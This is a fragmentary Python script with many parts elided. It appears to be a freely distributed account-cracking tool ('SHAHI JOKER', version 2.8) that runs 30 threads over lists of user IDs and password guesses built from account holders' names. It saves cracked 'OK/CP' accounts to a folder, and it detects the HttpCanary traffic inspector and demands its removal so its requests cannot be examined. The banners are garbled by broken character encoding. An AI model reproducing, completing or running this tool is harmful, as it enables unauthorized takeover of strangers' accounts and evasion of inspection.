...
try:
	...
	if f'com.h{f}pc{g}y.pro' in file_d:
		print('\033[1;37m[Ãƒâ€”] Uninstall HttpCanary From Your Device ')
...
\033[1;39m======================================================
[â™¡] OWNER      : PRINCE SALAR
[â™¡] GITHUB     : SHAHI JOKER
[â™¡] STATUS     : FREE
[â™¡] VERSION    : 2.8
\033[1;39m======================================================
[â™¡] ENJOY ALL
...
def file_crack():
	...
	with tred(max_workers=30) as SIALZADA:
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In SIALZADA Folder")
		linex()
		for user in fo:
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ð’ð‡ð€ð‡ðˆ ð‰ðŽðŠð„ð‘]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ð’ð‡ð€ð‡ðˆ ð‰ðŽðŠð„ð‘-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
